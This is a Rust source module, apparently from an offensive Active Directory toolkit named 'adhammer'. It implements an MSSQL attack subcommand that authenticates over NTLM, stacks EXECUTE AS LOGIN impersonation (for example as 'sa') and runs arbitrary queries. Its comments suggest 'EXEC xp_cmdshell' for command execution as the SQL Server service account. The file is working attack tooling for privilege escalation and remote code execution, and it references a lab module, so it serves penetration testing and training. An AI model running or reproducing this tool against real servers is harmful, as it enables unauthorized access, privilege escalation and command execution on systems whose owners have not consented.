//! MSSQL — TDS 7.4 client + xp_cmdshell + `EXECUTE AS` impersonation.
//!
//! Connects to MSSQL over TCP (default 1433), performs the TLS-in-TDS PreLogin
//! handshake if the server demands encryption, and authenticates via NTLM using
//! the same host/domain/user/password shape as every other attack subcommand.
//!
//! `--execute-as sa,other` pushes impersonation frames (LIFO) before running
//! `--query`; REVERT unwinds them in reverse on both success and error paths.
//!
//! NOTE: `ms-tds` 0.1.x does not yet decode ROW / COLMETADATA — the client
//! surfaces server INFO/ERROR messages and the DONE `row_count`, but not the
//! per-column values themselves. `xp_cmdshell` output arrives as ROW tokens
//! and will be counted (row_count) but not rendered until the row decoder
//! lands. Sufficient for the "did it run + who am I" check the CAPE lab
//! module tests; a full row-render lands with the ms-tds ROW decoder.

use anyhow::{Context, Result};
use clap::Parser;

#[derive(Parser)]
pub(crate) struct MssqlArgs {
    #[command(flatten)]
    pub auth: crate::shared_args::SmbAuth,
    /// SQL query to run once connected (single statement). Common:
    /// `EXEC xp_cmdshell 'whoami'` (RCE as the SQL Server service account),
    /// `SELECT SUSER_NAME()` (proves impersonation stacked).
    #[arg(long)]
    pub query: String,
    /// MSSQL TCP port (default 1433). Named-instance resolution (SQL Browser
    /// on UDP 1434) is not implemented — pass the resolved port directly.
    #[arg(long, default_value_t = 1433)]
    pub port: u16,
    /// Database to `USE` first (default: the login's default database).
    #[arg(long)]
    pub database: Option<String>,
    /// Print server messages as TSV (default: labelled block per DONE batch).
    #[arg(long)]
    pub tsv: bool,
    /// Impersonation chain: `EXECUTE AS LOGIN='<name>'` for each entry in
    /// order (each layer requires `IMPERSONATE` on the target login), then
    /// `--query`, then `REVERT` for each stacked layer in reverse. Comma-
    /// separated: `--execute-as sa,another_login`.
    #[arg(long, value_delimiter = ',')]
    pub execute_as: Vec<String>,
}

/// Connect → NTLM login → optional `USE <db>` → stacked `EXECUTE AS` → user
/// query → LIFO `REVERT`. REVERT is best-effort on error to leave the session
/// in a clean state before it drops.
pub(crate) async fn mssql(mut a: MssqlArgs) -> Result<()> {
    a.auth.password = crate::resolve_secret(&a.auth.password, "ADHAMMER_PASSWORD")?;

    let mut c = ms_tds::TdsClient::connect(&a.auth.host, a.port, None)
        .await
        .with_context(|| format!("TDS connect {}:{}", a.auth.host, a.port))?;
    tracing::info!(
        target: "adhammer::mssql",
        "TDS session up (encrypted={})",
        c.is_encrypted()
    );

    c.login_ntlm(&a.auth.domain, &a.auth.user, &a.auth.password)
        .await
        .with_context(|| {
            format!(
                "NTLM login {}\\{} @ {}:{}",
                a.auth.domain, a.auth.user, a.auth.host, a.port
            )
        })?;
    tracing::info!(target: "adhammer::mssql", "NTLM login OK");

    if let Some(db) = &a.database {
        let use_sql = format!("USE [{}]", db.replace(']', "]]"));
        let rs = c
            .run_query(&use_sql)
            .await
            .with_context(|| format!("USE {db}"))?;
        report_result(&format!("USE {db}"), &rs, a.tsv);
    }

    let mut stacked = 0usize;
    for principal in &a.execute_as {
        if let Err(e) = c.impersonate(principal).await {
            eprintln!("[-] EXECUTE AS LOGIN='{principal}' failed: {e:#}");
            revert_stack(&mut c, stacked).await;
            return Err(e).with_context(|| format!("EXECUTE AS LOGIN='{principal}'"));
        }
        stacked += 1;
        eprintln!("[+] EXECUTE AS LOGIN='{principal}' pushed (frame {stacked})");
    }

    let query_result = c.run_query(&a.query).await;

    // Always unwind the impersonation chain we pushed, whether the user
    // query succeeded or not. If REVERT itself errors we log it and keep
    // draining — the session is dying anyway.
    revert_stack(&mut c, stacked).await;

    match query_result {
        Ok(rs) => {
            report_result(&a.query, &rs, a.tsv);
            Ok(())
        }
        Err(e) => Err(e).context("user query"),
    }
}

/// Pop `n` impersonation frames LIFO. Errors are logged but not propagated —
/// the caller is either returning success (nothing to add) or already
/// carrying a fatal error we don't want to shadow.
async fn revert_stack(c: &mut ms_tds::TdsClient, n: usize) {
    for i in (1..=n).rev() {
        match c.revert_to_self().await {
            Ok(()) => eprintln!("[+] REVERT (frame {i})"),
            Err(e) => eprintln!("[!] REVERT (frame {i}) failed: {e:#}"),
        }
    }
}

/// Render a `ResultSet` — messages + `row_count`. ROW values are not yet
/// decoded upstream (see module docs), so per-column output isn't available.
/// `tsv` collapses each message to `msg<TAB>...`; the default splits per batch.
fn report_result(label: &str, rs: &ms_tds::ResultSet, tsv: bool) {
    if tsv {
        for m in &rs.messages {
            println!("msg\t{m}");
        }
        println!("done\t{}", rs.row_count);
        return;
    }
    println!("== {label} ==");
    if rs.messages.is_empty() {
        println!("  (no server messages)");
    } else {
        for m in &rs.messages {
            println!("  msg: {m}");
        }
    }
    println!("  rows: {}", rs.row_count);
    if rs.row_count > 0 && rs.rows.is_empty() {
        println!(
            "  note: {} row(s) returned but per-column values not decoded (ms-tds ROW decoder pending)",
            rs.row_count
        );
    }
}
